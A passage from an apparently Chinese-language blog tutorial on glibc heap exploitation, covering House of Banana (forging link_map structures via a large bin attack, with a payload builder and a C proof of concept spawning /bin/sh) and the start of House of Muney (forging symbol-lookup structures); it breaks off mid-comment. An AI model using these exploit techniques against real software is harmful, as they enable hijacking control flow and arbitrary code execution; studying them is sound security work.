LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">	     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">	     the main namespace.  */</span></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure></div> 这段代码的主要逻辑是遍历 _dl_ns
数组，对于_dl_ns 中的某个元素，将 _ns_loaded 链表中的元素放入 maps
数组然后遍历 maps 数组。对于 maps
数组中的每个元素，如果满足一些条件，最终会调用其中
<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>
指向的函数数组中的所有函数。</p>
<p>通过分析可知可以利用 large bin attack 劫持 _rtld_global 的 _ns_loaded
指针然后伪造 link_map 链表从而劫持程序流程。</p>
<p>在伪造 link_map 的时候需要绕过如下检查：</p>
<ul>
<li>为了确保伪造的 link_map 能够加入到 map 数组中，需要令
<code>l_real</code> 指针指向 link_map 结构体自身。<br />
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">   &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line">	</span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line">	</span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div></li>
<li>为了绕过如下检查，需要让 link_map 链表中的元素个数为 4 ，因为
_rtld_global 中的 _ns_nloaded 默认为 4 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div></li>
<li>为了确保能够进入下面的 if 判断，需要让该 link_map 的 l_init_called
位置 1 . <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br></pre></td></tr></table></figure></div> 最终伪造的结构如下图所示，其中 link_map
链表可以伪造到一个 chunk 中，或者将 l_next 指针指向原来的 link_map
链表： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d9e1f626bcecb35ba724ac9a80266490.png"
                     
alt="在这里插入图片描述" 
                > 然而这个 <code>link_map</code>
不能随便伪造，否则过不了 <code>_dl_sort_maps</code> 函数。原作者伪造的
<code>link_map</code> 结构如下：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e6dcaa9f3a5093d754c6ff38efdea67c.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 2</span></span><br><span class="line">payload += p64(link_map_addr)  <span class="comment"># 3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 13</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x30</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x20 l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x21</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x23</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x22 l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x23 &lt;-l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">8</span>)  <span class="comment"># 0x24</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x30 &lt;-l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x32</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x31</span></span><br><span class="line">payload += p64(one_gadget)  <span class="comment"># 0x32</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x334</span> - <span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p8(<span class="number">1</span> &lt;&lt; <span class="number">4</span>)  <span class="comment"># l-&gt;l_init_called</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_banana" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span> - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x5e6040</span>;</span><br><span class="line">    <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">    <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">    *(<span class="type">size_t</span> *) (ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a _rtld_global</span></span><br><span class="line">    <span class="type">size_t</span> fake_rtld_global_addr = (<span class="type">size_t</span>) (ptr1 - <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *) ptr1;</span><br><span class="line">    <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">    fake_rtld_global[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">3</span>] = <span class="number">0</span>;<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a fini_array segment</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x20</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x30</span>];<span class="comment">//l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x22</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x23</span>];<span class="comment">//l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x23</span> + <span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;<span class="comment">//l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_rtld_global[<span class="number">-2</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x32</span>];<span class="comment">//l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//funcs</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x32</span>] = (<span class="type">size_t</span>) backdoor;<span class="comment">//array[0]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">// l_init_called</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="house-of-muney">House of Muney</h1>
<p>在 glibc 中如果申请一块很大的内存会调用 <code>mmap</code>
分配一块贴近 glibc 的内存，此时如果修改掉 chunk 头的 size
然后释放掉就会将 glibc
中的部分内存释放掉，此时再次申请一块很大的内存会把释放掉的 glibc
重新申请回来，从而完成对 glibc 的劫持。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c9185a13808c3e1cf61d21b43ab5eec5.png"
                     
alt="在这里插入图片描述" 
                > 劫持 glibc
后，可以通过伪造延迟绑定相关结构劫持程序执行流程。</p>
<p>在延迟绑定过程有如下调用链： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve_xsavec -&gt; _dl_fixup -&gt; _dl_lookup_symbol_x -&gt; do_lookup_x</span><br></pre></td></tr></table></figure></div> <code>do_lookup_x</code>
需要注意的地方写在代码注释中了，<strong>具体需要伪造的结构的位置以及需要伪造的值通过调试确定</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__attribute_noinline__</span><br><span class="line"><span class="title function_">do_lookup_x</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *undef_name, <span class="type">uint_fast32_t</span> new_hash,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *old_hash, <span class="type">const</span> ElfW(Sym) *ref,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> sym_val *result, <span class="keyword">struct</span> r_scope_elem *scope, <span class="type">size_t</span> i,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> link_map *skip, <span class="type">int</span> type_class, <span class="keyword">struct</span> link_map *undef_map)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n = scope-&gt;r_nlist;</span><br><span class="line">    <span class="comment">/* Make sure we read the value before proceeding.  Otherwise we</span></span><br><span class="line"><span class="comment">       might use r_list pointing to the initial scope and r_nlist being</span></span><br><span class="line"><span class="comment">       the value after a resize.  That is the only path in dl-open.c not</span></span><br><span class="line"><span class="comment">       protected by GSCOPE.  A read barrier here might be to expensive.  */</span></span><br><span class="line">    __asm <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;&quot;</span> : <span class="string">&quot;+r&quot;</span> (n), <span class="string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">list</span> =</span> scope-&gt;r_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> <span class="built_in">list</span>[i]-&gt;l_real;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == skip)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span></span><br><span class="line">        <span class="keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Do not look into objects which are going to be removed.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_removed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Print some debugging info if wanted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))</span><br><span class="line">            _dl_debug_printf(<span class="string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,</span><br><span class="line">                             undef_name, DSO_FILENAME (<span class="built_in">map</span>-&gt;l_name),</span><br><span class="line">                             <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the hash table is empty there is nothing to do here.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_nbuckets == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        Elf_Symndx symidx;</span><br><span class="line">        <span class="type">int</span> num_versions = <span class="number">0</span>;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *versioned_sym = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* The tables for this map.  */</span></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_SYMTAB]);</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *bitmask = <span class="built_in">map</span>-&gt;l_gnu_bitmask;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (bitmask != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; <span class="comment">// 在对应位置伪造 bitmask_word 。</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>)) &#123; <span class="comment">// 伪造 bitmask_word 通过这个判断，具体是要让 bitmask_word 的 hashbit1 和 hashbit2 两个位都置位，需要通过调试确定。</span></span><br><span class="line">                Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets]; <span class="comment">// 在对应位置伪造 bucket 的值。</span></span><br><span class="line">                <span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<span class="comment">// 在对应位置伪造 hasharr 的值为 new_hash 。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">                            symidx = ELF_MACHINE_HASH_SYMIDX (<span class="built_in">map</span>, hasharr);</span><br><span class="line">                            sym = check_match(undef_name, ref, version, flags, <span class="comment">// 进这个函数，symtab[symidx] 对应位置需要伪造符号表。</span></span><br><span class="line">                                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                                              &amp;num_versions);</span><br><span class="line">                            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                                <span class="keyword">goto</span> found_it;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* No symbol found.  */</span></span><br><span class="line">            symidx = SHN_UNDEF;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If we have seen exactly one versioned symbol while we are</span></span><br><span class="line"><span class="comment">       looking for an unversioned symbol and the version is not the</span></span><br><span class="line"><span class="comment">       default version we still accept this symbol since there are</span></span><br><span class="line"><span class="comment">       no possible ambiguities.  */</span></span><br><span class="line">        sym = num_versions == <span class="number">1</span> ? versioned_sym : <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sym != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            found_it:</span><br><span class="line">            <span class="comment">/* When UNDEF_MAP is NULL, which indicates we are called from</span></span><br><span class="line"><span class="comment">               do_lookup_x on relocation against protected data, we skip</span></span><br><span class="line"><span class="comment">               the data definion in the executable from copy reloc.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA</span><br><span class="line">                &amp;&amp; undef_map == <span class="literal">NULL</span> <span class="comment">// undef_map 不为 NULL 所以不进这个 if 判断。</span></span><br><span class="line">                &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable</span><br><span class="line">                &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Hidden and internal symbols are local, ignore them.  */</span></span><br><span class="line">			<span class="comment">// sym-&gt;st_other 既不能等于 STV_HIDDEN(2) 也不能等于 STV_INTERNAL(1) 。</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (dl_symbol_visibility_binds_local_p(sym)))</span><br><span class="line">                <span class="keyword">goto</span> skip;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// sym-&gt;st_info == STB_GLOBAL(1)</span></span><br><span class="line">            <span class="keyword">switch</span> (ELFW(ST_BIND) (sym-&gt;st_info)) &#123;</span><br><span class="line">				...</span><br><span class="line">                <span class="keyword">case</span> STB_GLOBAL:</span><br><span class="line">                    <span class="comment">/* Global definition.  Just what we need.  */</span></span><br><span class="line">                    result-&gt;s = sym;</span><br><span class="line">                    result-&gt;m = (<span class="keyword">struct</span> link_map *) <span class="built_in">map</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 从这里返回 1 表示找到。</span></span><br><span class="line">				...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        skip:;</span><br><span class="line">    &#125; <span class="keyword">while</span> (++i &lt; n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We have not found anything until now.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>check_match</code> 函数中需要伪造符号表。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *</span><br><span class="line"><span class="title function_">check_match</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> undef_name,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> ref,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> type_class,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> sym,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> Elf_Symndx symidx,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> strtab,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> link_map *<span class="type">const</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) **<span class="type">const</span> versioned_sym,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> *<span class="type">const</span> num_versions)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">    assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// 这里要求 sym-&gt;st_value 不为空且 sym-&gt;st_shndx 不等于 SHN_UNDEF(0) 。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line">                           &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line">                           &amp;&amp; stt != STT_TLS)</span><br><span class="line">                          || ELF_MACHINE_SYM_NO_MATCH(sym)</span><br><span class="line">                          || (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">       STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">       code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">    <span class="comment">// sym-&gt;st_info 的低 4 